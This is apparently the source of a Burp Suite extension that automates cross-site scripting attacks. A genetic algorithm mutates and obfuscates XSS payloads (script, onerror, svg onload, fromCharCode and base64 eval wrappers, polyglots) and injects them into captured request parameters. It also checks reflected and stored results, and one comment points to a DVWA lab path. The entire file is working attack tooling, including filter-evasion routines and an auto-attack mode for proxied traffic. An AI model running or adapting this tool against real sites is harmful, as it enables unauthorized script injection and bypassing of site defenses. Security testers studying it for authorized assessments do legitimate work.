# -*- coding: utf-8 -*-
"""
XSS Optimizer GA - Show Real ParamName=Value in the Table + GA Explanation
"""

from burp import IBurpExtender, IHttpListener, ITab, IContextMenuFactory
from javax.swing import (
    JPanel, JButton, JTextArea, JScrollPane, JTable, JSplitPane,
    JMenuItem, JCheckBox, JLabel, SwingUtilities, JTabbedPane, JPopupMenu
)
from javax.swing.table import DefaultTableModel
from java.awt import BorderLayout, Dimension, FlowLayout
from java.lang import Runnable, System
from java.util.concurrent import Executors
import random
import threading
import os
import json
import re
import base64
from java.net import URL

try:
    from bs4 import BeautifulSoup
except ImportError:
    BeautifulSoup = None
    print("[!] BeautifulSoup not available - limited DOM parse.")

################################################################################
# Directorios/archivos
################################################################################
TMP_DIR = System.getProperty("java.io.tmpdir")
XSS_DIR = os.path.join(TMP_DIR, "xss_optimizer")
if not os.path.exists(XSS_DIR):
    try:
        os.mkdir(XSS_DIR)
        print("[+] Created folder =>", XSS_DIR)
    except:
        pass

CSV_FILE_PATH = os.path.join(XSS_DIR, "xss_optimizer.csv")
TECH_EFF_JSON = os.path.join(XSS_DIR, "tech_eff.json")

################################################################################
# Payload
################################################################################
COMMON_PAYLOADS = [
    "<script>alert('XSS_%%ID%%')</script>",
    "<img src=x onerror=alert('XSS_%%ID%%')>",
    "<svg onload=alert('XSS_%%ID%%')>",
    "<iframe src=javascript:alert('XSS_%%ID%%')></iframe>",
    "' onfocus=alert('XSS_%%ID%%') '",
    "' onclick=alert('XSS_%%ID%%') '",
    "\" onmouseover=alert('XSS_%%ID%%') \"",
    "'><script>alert('XSS_%%ID%%')</script>"
]

TECHNIQUES = [
    "none","html","url","js_obfuscate","polyglot",
    "attr_obfuscate","tag_obfuscate","base64_encode"
]

TECHNIQUE_EFFECTIVENESS = {}
LOG_ENTRY_ID = 0

################################################################################
# CSV + JSON
################################################################################
def ensure_csv_header():
    global LOG_ENTRY_ID
    if not os.path.exists(CSV_FILE_PATH):
        try:
            with open(CSV_FILE_PATH,"w") as f:
                f.write("ID,URL,Param,Method,Status,Result,Payload\n")
            LOG_ENTRY_ID=0
        except:
            LOG_ENTRY_ID=0
    else:
        try:
            with open(CSV_FILE_PATH,"r") as f:
                ln_count= sum(1 for _ in f)
            LOG_ENTRY_ID= 0 if ln_count<=1 else ln_count-1
        except:
            LOG_ENTRY_ID=0

def append_to_csv(url, param, method, code, result, payload):
    global LOG_ENTRY_ID
    ensure_csv_header()
    LOG_ENTRY_ID+=1
    def s(x):
        return str(x).replace("\n","").replace("\r","") if x else ""
    line= "{},{},{},{},{},{},{}\n".format(
        LOG_ENTRY_ID, s(url), s(param), s(method),
        s(code), s(result), s(payload)
    )
    try:
        with open(CSV_FILE_PATH,"a") as f:
            f.write(line)
    except Exception as e:
        print("[!] CSV error =>", e)

def load_effectiveness():
    global TECHNIQUE_EFFECTIVENESS
    if os.path.exists(TECH_EFF_JSON):
        try:
            with open(TECH_EFF_JSON,"r") as f:
                data= f.read().strip()
                if data.startswith("{"):
                    TECHNIQUE_EFFECTIVENESS= json.loads(data)
                else:
                    TECHNIQUE_EFFECTIVENESS={}
            print("[+] Loaded effect =>", TECH_EFF_JSON)
        except Exception as e:
            print("[!] load JSON =>", e)
            TECHNIQUE_EFFECTIVENESS={}
    else:
        TECHNIQUE_EFFECTIVENESS= {}

def save_effectiveness():
    global TECHNIQUE_EFFECTIVENESS
    try:
        with open(TECH_EFF_JSON,"w") as f:
            json.dump(TECHNIQUE_EFFECTIVENESS, f, indent=2)
        print("[+] Saved effect =>", TECH_EFF_JSON)
    except:
        pass

################################################################################
# Aux
################################################################################
def get_base_url(url_string):
    try:
        u= URL(url_string)
        port_s= "" if u.getPort()==-1 else ":"+ str(u.getPort())
        return u.getProtocol()+ "://"+ u.getHost()+ port_s+ u.getPath()
    except:
        return url_string

def search_in_dom(response_str, unique_id):
    if not BeautifulSoup:
        return (unique_id in response_str)
    try:
        soup= BeautifulSoup(response_str,"html.parser")
        if soup.find(string=re.compile(re.escape(unique_id))):
            return True
        for tg in soup.find_all():
            for vl in tg.attrs.values():
                if unique_id in str(vl):
                    return True
        return False
    except:
        return (unique_id in response_str)

def follow_redirects(self, http_service, requestResponse):
    # simplified => single redirect
    resp= requestResponse.getResponse()
    if not resp: return (None, resp)
    st= self._helpers.analyzeResponse(resp).getStatusCode()
    if st in [301,302,303,307,308]:
        rinfo= self._helpers.analyzeResponse(resp)
        heads= rinfo.getHeaders()
        loc= None
        for h in heads:
            if h.lower().startswith("location:"):
                loc= h.split(":",1)[1].strip()
                break
        if loc:
            base_req= self._helpers.bytesToString(requestResponse.getRequest())
            old_head_lines= base_req.split("\r\n\r\n",1)[0].split("\r\n")
            if loc.lower().startswith("http"):
                newurl= loc
            else:
                baseu= get_base_url(str(self._helpers.analyzeRequest(http_service, requestResponse.getRequest()).getUrl()))
                newurl= re.sub(r"/[^/]*$","/", baseu)+ loc.lstrip("/")
            path_= URL(newurl).getFile()
            host_= URL(newurl).getHost()
            new_headers= []
            new_headers.append("GET {} HTTP/1.1".format(path_))
            have_host= False
            for oh in old_head_lines[1:]:
                if oh.lower().startswith("host:"):
                    new_headers.append("Host: {}".format(host_))
                    have_host= True
                elif oh.lower().startswith("content-length:"):
                    continue
                elif oh.lower().startswith("post ") or oh.lower().startswith("get "):
                    continue
                else:
                    new_headers.append(oh)
            if not have_host:
                new_headers.append("Host: {}".format(host_))
            final_s= "\r\n".join(new_headers)+ "\r\n\r\n"
            rr= self._callbacks.makeHttpRequest(http_service, self._helpers.stringToBytes(final_s))
            return (self._helpers.analyzeResponse(rr.getResponse()).getStatusCode(), rr.getResponse())
        else:
            return (st, resp)
    return (st, resp)

def post_check_stored(self, http_service, baseRequest, unique_id):
    """
    Revisita /dvwa/vulnerabilities/xss_s/ reusando cookies.
    Ajustar si tu DVWA esta en otra ruta.
    """
    final_url= "/dvwa/vulnerabilities/xss_s/"
    base_req_str= self._helpers.bytesToString(baseRequest)
    rinf= self._helpers.analyzeRequest(http_service, baseRequest)
    host_= http_service.getHost()
    old_heads= rinf.getHeaders()
    new_heads= []
    new_heads.append("GET {} HTTP/1.1".format(final_url))
    have_host= False
    for hh in old_heads[1:]:
        if hh.lower().startswith("host:"):
            new_heads.append("Host: {}".format(host_))
            have_host= True
        elif hh.lower().startswith("content-length:"):
            continue
        elif hh.lower().startswith("content-type:"):
            continue
        elif hh.lower().startswith("post ") or hh.lower().startswith("get "):
            continue
        else:
            new_heads.append(hh)
    if not have_host:
        new_heads.append("Host: {}".format(host_))
    final_s= "\r\n".join(new_heads)+ "\r\n\r\n"
    rr= self._callbacks.makeHttpRequest(http_service, self._helpers.stringToBytes(final_s))
    r2= rr.getResponse()
    if not r2:
        return False
    resp_str= self._helpers.bytesToString(r2)
    return (unique_id in resp_str)

def launch_new_attack(self, e):
    sr= self.table.getSelectedRow()
    if sr>=0 and sr< len(self.results):
        url= self.results[sr][0]
        self.attack_in_progress[url]= True
        rq= self.results[sr][6]
        svc= self.results[sr][8]
        self.executor.submit(self.optimize_task(self,rq,svc,sr, max_attempts=0))

def stop_attack(self, e):
    sr= self.table.getSelectedRow()
    if sr>=0 and sr< len(self.results):
        url= self.results[sr][0]
        self.attack_in_progress[url]= False
        print("[*] Attack stopped =>", url)

################################################################################
class BurpExtender(IBurpExtender, IHttpListener, ITab, IContextMenuFactory):

    launch_new_attack= launch_new_attack
    stop_attack= stop_attack

    def registerExtenderCallbacks(self, callbacks):
        self._callbacks= callbacks
        self._helpers= callbacks.getHelpers()
        callbacks.setExtensionName("XSS GA (param=valor in table)")

        print("[+] Plugin OK")
        load_effectiveness()
        ensure_csv_header()

        callbacks.registerHttpListener(self)
        callbacks.addSuiteTab(self)
        callbacks.registerContextMenuFactory(self)

        self.results= []
        self.auto_optimize= False
        self.proxy_capture= False
        self.attack_in_progress= {}

        self.executor= Executors.newFixedThreadPool(2)
        self.lock= threading.Lock()

    def getTabCaption(self):
        return "XSS Optimizer"

    def getUiComponent(self):
        p= JPanel(BorderLayout())
        try:
            self.table_model= DefaultTableModel(["URL","Method","Param","Payload","Code","Result"],0)
            self.table= JTable(self.table_model)
            self.table.setAutoCreateRowSorter(True)
            self.table.getSelectionModel().addListSelectionListener(self.table_sel_listener)
            self.table.setComponentPopupMenu(self.create_popup())

            sp= JScrollPane(self.table)
            sp.setPreferredSize(Dimension(800,250))

            self.req_tabs= JTabbedPane()
            self.req_raw= JTextArea(10,40); self.req_raw.setEditable(False)
            self.req_pretty= JTextArea(10,40); self.req_pretty.setEditable(False)
            self.req_tabs.addTab("Raw", JScrollPane(self.req_raw))
            self.req_tabs.addTab("Pretty", JScrollPane(self.req_pretty))

            self.res_tabs= JTabbedPane()
            self.res_raw= JTextArea(10,40); self.res_raw.setEditable(False)
            self.res_pretty= JTextArea(10,40); self.res_pretty.setEditable(False)
            self.res_render= JTextArea(10,40); self.res_render.setEditable(False)
            self.res_tabs.addTab("Raw", JScrollPane(self.res_raw))
            self.res_tabs.addTab("Pretty", JScrollPane(self.res_pretty))
            self.res_tabs.addTab("Render", JScrollPane(self.res_render))

            bot= JSplitPane(JSplitPane.HORIZONTAL_SPLIT, self.req_tabs, self.res_tabs)
            bot.setResizeWeight(0.5)

            main_split= JSplitPane(JSplitPane.VERTICAL_SPLIT, sp, bot)
            main_split.setResizeWeight(0.6)
            p.add(main_split, BorderLayout.CENTER)

            cpanel= JPanel(FlowLayout())
            opt_sel_btn= JButton("Optimize Selected", actionPerformed=self.optimize_selected)
            intr_btn= JButton("Send to Intruder", actionPerformed=self.send_to_intruder)
            rep_btn= JButton("Send to Repeater", actionPerformed=self.send_to_repeater)
            self.ck_proxy= JCheckBox("Proxy Capture", actionPerformed=self.toggle_proxy)
            self.ck_auto= JCheckBox("Auto-Optimize", actionPerformed=self.toggle_auto)
            self.status_lbl= JLabel("Status: Idle")

            cpanel.add(opt_sel_btn)
            cpanel.add(intr_btn)
            cpanel.add(rep_btn)
            cpanel.add(self.ck_proxy)
            cpanel.add(self.ck_auto)
            cpanel.add(self.status_lbl)
            p.add(cpanel, BorderLayout.SOUTH)
        except Exception as e:
            print("[!] UI error =>", e)
            return JPanel()
        return p

    def create_popup(self):
        pop= JPopupMenu()
        l_a= JMenuItem("Launch Attack", actionPerformed=self.launch_new_attack)
        s_a= JMenuItem("Stop Attack", actionPerformed=self.stop_attack)
        d_l= JMenuItem("Delete Row", actionPerformed=self.delete_line)
        pop.add(l_a)
        pop.add(s_a)
        pop.add(d_l)
        return pop

    def table_sel_listener(self, e):
        if e.getValueIsAdjusting():
            return
        sr= self.table.getSelectedRow()
        if sr>=0 and sr< len(self.results):
            try:
                req, resp= self.results[sr][6], self.results[sr][7]
                if req:
                    req_str= self._helpers.bytesToString(req)
                    self.req_raw.setText(req_str)
                    self.req_pretty.setText(self.format_pretty(req_str))
                else:
                    self.req_raw.setText("No request")
                    self.req_pretty.setText("No request")
                if resp:
                    resp_str= self._helpers.bytesToString(resp)
                    self.res_raw.setText(resp_str)
                    self.res_pretty.setText(self.format_pretty(resp_str))
                    self.res_render.setText(self.format_render(resp_str))
                else:
                    self.res_raw.setText("No response")
                    self.res_pretty.setText("No response")
                    self.res_render.setText("No response")
            except Exception as ex:
                print("[!] table select =>", ex)

    def format_pretty(self, txt):
        if not txt: return ""
        try:
            lines= txt.split("\n")
            out=""
            indent=0
            for ln in lines:
                ln= ln.strip()
                out+= "  "*indent + ln+ "\n"
                if ln.endswith("{") or ln.endswith("("):
                    indent+=1
                elif ln.startswith("}") or ln.startswith(")"):
                    indent= max(0, indent-1)
            return out
        except:
            return txt

    def format_render(self, txt):
        try:
            an= self._helpers.analyzeResponse(self._helpers.stringToBytes(txt))
            boff= an.getBodyOffset()
            return txt[boff:] if boff>0 else txt
        except:
            return txt

    def toggle_auto(self, e):
        self.auto_optimize= self.ck_auto.isSelected()
        print("[*] Auto-Optimize =>", self.auto_optimize)
        if self.auto_optimize:
            self.status_lbl.setText("Auto-Opt running...")
            for i,itm in enumerate(self.results):
                if (itm[3] is None or itm[3]=="Pendiente") and itm[2]:
                    rq= itm[6]
                    svc= itm[8]
                    if svc:
                        self.executor.submit(self.optimize_task(self, rq, svc, i))
            SwingUtilities.invokeLater(lambda: self.status_lbl.setText("Status: Idle"))
        else:
            self.status_lbl.setText("Status: Idle")

    def toggle_proxy(self, e):
        self.proxy_capture= self.ck_proxy.isSelected()
        print("[*] Proxy =>", self.proxy_capture)

    def optimize_selected(self, e):
        sr= self.table.getSelectedRow()
        if sr>=0 and sr< len(self.results):
            if self.results[sr][3] is None or self.results[sr][3]=="Pendiente":
                rq= self.results[sr][6]
                svc= self.results[sr][8]
                if not svc:
                    print("[!] No svc => can't optimize")
                    return
                self.executor.submit(self.optimize_task(self, rq, svc, sr))
            else:
                print("[*] row already optimized =>", sr)
        else:
            print("[!] No row selected")

    def delete_line(self, e):
        sr= self.table.getSelectedRow()
        if sr>=0 and sr< len(self.results):
            with self.lock:
                self.table_model.removeRow(sr)
                del self.results[sr]
            print("[*] Deleted row =>", sr)
        else:
            print("[!] No row selected")

    def send_to_intruder(self, e):
        sr= self.table.getSelectedRow()
        if sr>=0 and sr< len(self.results):
            rq= self.results[sr][6]
            svc= self.results[sr][8]
            if not svc:
                print("[!] No svc => intruder")
                return
            self._callbacks.sendToIntruder(
                svc.getHost(),
                svc.getPort(),
                (svc.getProtocol()=="https"),
                rq
            )
            print("[*] Sent to Intruder =>", self.results[sr][0])
        else:
            print("[!] No row selected")

    def send_to_repeater(self, e):
        sr= self.table.getSelectedRow()
        if sr>=0 and sr< len(self.results):
            rq= self.results[sr][6]
            svc= self.results[sr][8]
            if not svc:
                print("[!] No svc => repeater")
                return
            self._callbacks.sendToRepeater(
                svc.getHost(),
                svc.getPort(),
                (svc.getProtocol()=="https"),
                rq,
                "XSS test => %s" % self.results[sr][0]
            )
            print("[*] Sent to Repeater =>", self.results[sr][0])
        else:
            print("[!] No row selected")

    def createMenuItems(self, invocation):
        try:
            ctx= invocation.getInvocationContext()
            if ctx in [
                invocation.CONTEXT_MESSAGE_EDITOR_REQUEST,
                invocation.CONTEXT_MESSAGE_VIEWER_REQUEST,
                invocation.CONTEXT_TARGET_SITE_MAP_TABLE,
                invocation.CONTEXT_PROXY_HISTORY,
                invocation.CONTEXT_INTRUDER_PAYLOAD_POSITIONS,
                invocation.CONTEXT_SCANNER_RESULTS
            ]:
                item= JMenuItem("Send to XSS Optimizer", actionPerformed=lambda x: self.send_to_optimizer(invocation))
                return [item]
            return None
        except Exception as ex:
            print("[!] createMenuItems =>", ex)
            return None

    def send_to_optimizer(self, invocation):
        try:
            sel_msgs= invocation.getSelectedMessages()
            if not sel_msgs:
                print("[!] No messages selected => cannot send")
                return
            for msg in sel_msgs:
                req= msg.getRequest()
                svc= msg.getHttpService()
                rinfo= self._helpers.analyzeRequest(svc, req)
                url= str(rinfo.getUrl())
                method= rinfo.getMethod()
                # enumerar param con getParameters
                allP= rinfo.getParameters()
                # guardamos (actualParamName=Value, indexInList)
                # skip cookies => paramType=2
                valid_params= [(pp.getName(), pp.getValue(), i) for i,pp in enumerate(allP) if pp.getType()!=2]
                if not valid_params:
                    # fallback => 1 param
                    param_label= "NoRealParam=???"
                    with self.lock:
                        self.table_model.addRow([url, method, param_label,"Pendiente","N/A","N/A"])
                        self.results.append([url, method, (param_label, 0), None,None,None, req,None,svc])
                else:
                    for i_,(nm,val, idxInAll) in enumerate(valid_params, start=1):
                        param_label= "%s=%s" % (nm,val)
                        def add_line_pl():
                            with self.lock:
                                self.table_model.addRow([url, method, param_label, "Pendiente","N/A","N/A"])
                                # en self.results, guardamos (param_label, idxInAll) => para inyectar en evaluate_xss
                                self.results.append([url, method, (param_label, idxInAll),
                                                     None,None,None, req,None, svc])
                                self.table.revalidate()
                                self.table.repaint()
                                print("[+] add param =>", param_label, "=>", url)
                        SwingUtilities.invokeLater(add_line_pl)
                        if self.auto_optimize:
                            idx_ = len(self.results)-1
                            self.executor.submit(self.optimize_task(self, req, svc, idx_))
        except Exception as ex:
            print("[!] send_to_optimizer =>", ex)

    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        if not self.proxy_capture:
            return
        try:
            if toolFlag== self._callbacks.TOOL_PROXY and messageIsRequest:
                req= messageInfo.getRequest()
                svc= messageInfo.getHttpService()
                rinf= self._helpers.analyzeRequest(svc, req)
                url= str(rinf.getUrl())
                method= rinf.getMethod()
                allP= rinf.getParameters()
                valid_params= [(pp.getName(), pp.getValue(), i) for i,pp in enumerate(allP) if pp.getType()!=2]
                if not valid_params:
                    param_label= "NoRealParam=???"
                    def add_1():
                        with self.lock:
                            self.table_model.addRow([url, method, param_label,"Pendiente","N/A","N/A"])
                            self.results.append([url, method, (param_label, 0),
                                                 None,None,None, req,None,svc])
                            print("[+] param =>", param_label, url)
                    SwingUtilities.invokeLater(add_1)
                    if self.auto_optimize:
                        idx_= len(self.results)-1
                        self.executor.submit(self.optimize_task(self, req, svc, idx_))
                else:
                    for i_,(nm,vv, idxInAll) in enumerate(valid_params, start=1):
                        param_label= "%s=%s" % (nm,vv)
                        def add_2(pl=param_label, idxAll= idxInAll):
                            with self.lock:
                                self.table_model.addRow([url, method, pl, "Pendiente","N/A","N/A"])
                                self.results.append([url, method, (pl, idxAll),
                                                     None,None,None, req,None, svc])
                                self.table.revalidate()
                                self.table.repaint()
                                print("[+] param =>", pl, "=>", url)
                        SwingUtilities.invokeLater(add_2)
                        if self.auto_optimize:
                            idxParam= len(self.results)-1
                            self.executor.submit(self.optimize_task(self, req, svc, idxParam))
        except Exception as ex:
            print("[!] processHttpMessage =>", ex)

    def evaluate_xss(self, request, http_service, param_data, url,
                     apply_ofuscation=False, obf_technique=None,
                     base_payload="<script>alert('XSS_%%ID%%')</script>", length=100):
        """
        param_data => (param_label, indexInAll) => param_label = "name=val", indexInAll => index in rinfo.getParameters() ignoring cookies
        """
        try:
            unique_id= "XSS_"+ str(random.randint(1000,9999))
            pay= base_payload.replace("%%ID%%", unique_id)
            if len(pay)> length:
                pay= pay[:length]
            if apply_ofuscation and obf_technique and obf_technique!="none":
                pay= self.obfuscate_payload(pay, obf_technique)
                if random.random()<0.3:
                    second_tech= random.choice([t for t in TECHNIQUES if t!="none"])
                    pay= self.obfuscate_payload(pay, second_tech)

            param_label, indexInAll= param_data
            # localizamos param con indexInAll en rinfo
            rinfo= self._helpers.analyzeRequest(http_service, request)
            allP= rinfo.getParameters()
            # ignorar cookies => paramType=2 => hay que contar
            non_cookies= [p for p in allP if p.getType()!= p.PARAM_COOKIE]
            if indexInAll>= len(non_cookies):
                # fallback
                new_req= request
            else:
                # actual param => non_cookies[indexInAll]
                param_to_mod= non_cookies[indexInAll]
                new_par= self._helpers.buildParameter(param_to_mod.getName(), pay, param_to_mod.getType())
                new_req= self._helpers.updateParameter(request, new_par)

            rr= self._callbacks.makeHttpRequest(http_service, new_req)
            st, final_resp= follow_redirects(self, http_service, rr)
            if not final_resp:
                append_to_csv(url, param_label,"N/A","N/A","no explotable", pay)
                return 0, pay, new_req, None,"N/A","no explotable"
            final_str= self._helpers.bytesToString(final_resp)
            code_= self._helpers.analyzeResponse(final_resp).getStatusCode()

            score=0
            result="no explotable"
            if code_>=300 and code_<400:
                score=2
            elif code_>=400 and code_<500:
                score=1
            elif code_>=500 and code_<600:
                score=-1

            if unique_id in final_str:
                score= max(score,5)
            if search_in_dom(final_str, unique_id) and code_==200:
                score=10
                result= "exploitable"

            # post-check stored
            if result!="exploitable":
                stc= post_check_stored(self, http_service, new_req, unique_id)
                if stc:
                    score=10
                    result= "exploitable"

            append_to_csv(url, param_label, "N/A", code_, result, pay)
            if result=="exploitable":
                from __main__ import TECHNIQUE_EFFECTIVENESS
                key_= url+"##"+ str(obf_technique)
                TECHNIQUE_EFFECTIVENESS[key_]= TECHNIQUE_EFFECTIVENESS.get(key_,0)+1

            return score, pay, new_req, final_resp, code_, result
        except Exception as e:
            print("[!] evaluate_xss =>", e)
            append_to_csv(url, param_data[0], "N/A","ERR","no explotable","ERROR_EVAL")
            return 0, base_payload, request, None,"ERR","no explotable"

    def obfuscate_payload(self, payload, technique):
        try:
            if random.random()<0.2 and "<" in payload and ">" in payload:
                idx= payload.find(">")
                arr= ["onerror","onload","onmouseover"]
                chosen= random.choice(arr)
                mut= " %s=alert('MUT')" % chosen
                payload= payload[:idx]+ mut + payload[idx:]
            if technique=="url":
                return self._helpers.urlEncode(payload)
            elif technique=="html":
                return payload.replace("<","&lt;").replace(">","&gt;")
            elif technique=="js_obfuscate":
                return "eval(String.fromCharCode(%s))" % ",".join(str(ord(c)) for c in payload)
            elif technique=="polyglot":
                return "javascript:/*--></title></script></textarea><script>%s</script>" % payload
            elif technique=="attr_obfuscate":
                if "<" in payload and ">" in payload:
                    i2= payload.find(">")
                    return payload[:i2]+ " onerror=alert('OOPS')"+payload[i2:]
                return payload
            elif technique=="tag_obfuscate":
                return payload.replace("<script>","<svg onload=").replace("</script>",">")
            elif technique=="base64_encode":
                enc= base64.b64encode(payload.encode("utf-8")).decode("utf-8")
                return "eval(atob('%s'))" % enc
            return payload
        except:
            return payload

    def optimize_task(self, outer_self, request, http_service, row_index, max_attempts=50):
        class GAEngine(Runnable):
            def __init__(self, ext):
                self.ext= ext
            def run(self):
                from __main__ import TECHNIQUE_EFFECTIVENESS
                try:
                    self.ext.status_lbl.setText("GA optimizing..")
                    param_data= self.ext.results[row_index][2]  # => (param_label, indexInAll)
                    url= self.ext.results[row_index][0]
                    self.ext.attack_in_progress[url]= True
                    found_ex= False
                    attempts=0
                    pop_size= 15
                    generations= 5
                    population= []
                    for _ in range(pop_size):
                        base_idx= random.randint(0, len(COMMON_PAYLOADS)-1)
                        tech_idx= random.randint(0, len(TECHNIQUES)-1)
                        length_v= random.randint(30,120)
                        population.append((base_idx, tech_idx, length_v))

                    while (not found_ex) and (attempts<max_attempts or max_attempts<=0) and self.ext.attack_in_progress.get(url,False):
                        for gen_ in range(generations):
                            if not self.ext.attack_in_progress.get(url,False):
                                break
                            evaluated= []
                            for ind in population:
                                b_i, t_i, l_val= ind
                                base_pl= COMMON_PAYLOADS[b_i]
                                technique= TECHNIQUES[t_i]
                                raw_score, final_pl, new_req, new_resp, new_code, new_res= self.ext.evaluate_xss(
                                    request, http_service, param_data, url,
                                    apply_ofuscation=(technique!="none"),
                                    obf_technique= technique,
                                    base_payload= base_pl,
                                    length= l_val
                                )
                                key_= url+"##"+ technique
                                bonus= TECHNIQUE_EFFECTIVENESS.get(key_,0)
                                fitness= raw_score+ bonus
                                evaluated.append((ind,(fitness,final_pl,new_req,new_resp,new_code,new_res)))
                            evaluated.sort(key=lambda x:x[1][0], reverse=True)
                            best_ind, best_data= evaluated[0]
                            best_score,best_pl,b_req,b_resp,b_code,b_result= best_data
                            with self.ext.lock:
                                self.ext.table_model.setValueAt(best_pl, row_index, 3)
                                self.ext.table_model.setValueAt(str(b_code), row_index, 4)
                                self.ext.table_model.setValueAt(b_result, row_index, 5)
                                self.ext.results[row_index][3:]= [
                                    best_pl,b_code,b_result,b_req,b_resp,http_service
                                ]
                            SwingUtilities.invokeLater(lambda: self.ext.table.repaint())
                            if b_result=="exploitable":
                                found_ex= True
                                break
                            # top 8
                            survivors= [x[0] for x in evaluated[:8]]
                            newpop= []
                            while len(newpop)< pop_size:
                                p1,p2= random.sample(survivors,2)
                                child=[]
                                for i_ in range(3):
                                    if random.random()<0.5:
                                        child.append(p1[i_])
                                    else:
                                        child.append(p2[i_])
                                if random.random()<0.3:
                                    child[1]= TECHNIQUES.index("polyglot")
                                    child[2]= random.randint(40,200)
                                if random.random()<0.2:
                                    gi= random.randint(0,2)
                                    if gi==0:
                                        child[0]= random.randint(0,len(COMMON_PAYLOADS)-1)
                                    elif gi==1:
                                        child[1]= random.randint(0,len(TECHNIQUES)-1)
                                    else:
                                        child[2]= random.randint(30,120)
                                newpop.append(tuple(child))
                            population= newpop
                        attempts+=1
                    if not found_ex:
                        print("[!] GA => no exploit =>", url, " after", attempts," attempts")
                except Exception as ex:
                    print("[!] GAEngine error =>", ex)
                    with self.ext.lock:
                        self.ext.table_model.setValueAt("Error", row_index, 3)
                        self.ext.table_model.setValueAt("N/A", row_index, 4)
                        self.ext.table_model.setValueAt("no explotable", row_index, 5)
                        self.ext.results[row_index][3:]= ["Error","N/A","no explotable",request,None,http_service]
                    SwingUtilities.invokeLater(lambda: self.ext.table.repaint())
                finally:
                    self.ext.status_lbl.setText("Status: Idle")
                    self.ext.attack_in_progress[url]= False
                    save_effectiveness()
        return GAEngine(self)